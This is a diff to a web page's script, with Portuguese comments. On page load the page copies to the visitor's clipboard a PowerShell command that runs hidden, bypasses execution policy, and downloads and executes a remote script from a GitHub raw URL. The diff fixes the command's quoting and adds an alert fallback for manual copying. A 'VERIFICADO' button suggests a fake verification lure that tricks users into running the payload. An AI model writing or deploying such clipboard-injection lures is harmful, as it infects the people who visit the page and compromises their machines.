@@ -88,9 +88,15 @@
 </div>
 
 <script>
+    // Texto corrigido com escape de aspas
+    var texto = "powershell -w 1 -ep bypass -c \"$a=(irm 'raw.githubusercontent.com/advancedvfxio-lgtm/teste/refs/heads/main/hello.ps1' -UseBasicParsing); $ExecutionContext.InvokeCommand.InvokeScript($a)\"";
+
     // Copia automaticamente ao abrir a página
-    navigator.clipboard.writeText("powershell -w 1 -ep bypass -c "$a=(irm 'raw.githubusercontent.com/advancedvfxio-lgtm/teste/refs/heads/main/hello.ps1' -UseBasicParsing);
-    $ExecutionContext.InvokeCommand.InvokeScript($a)"");
+    navigator.clipboard.writeText(texto).catch(function(err) {
+        // Fallback: seleciona o texto para copiar manualmente
+        console.error('Erro ao copiar:', err);
+        alert('Copie manualmente:\n\n' + texto);
+    });
 
     function verificar() {
         document.querySelector('.btn').textContent = 'VERIFICADO';
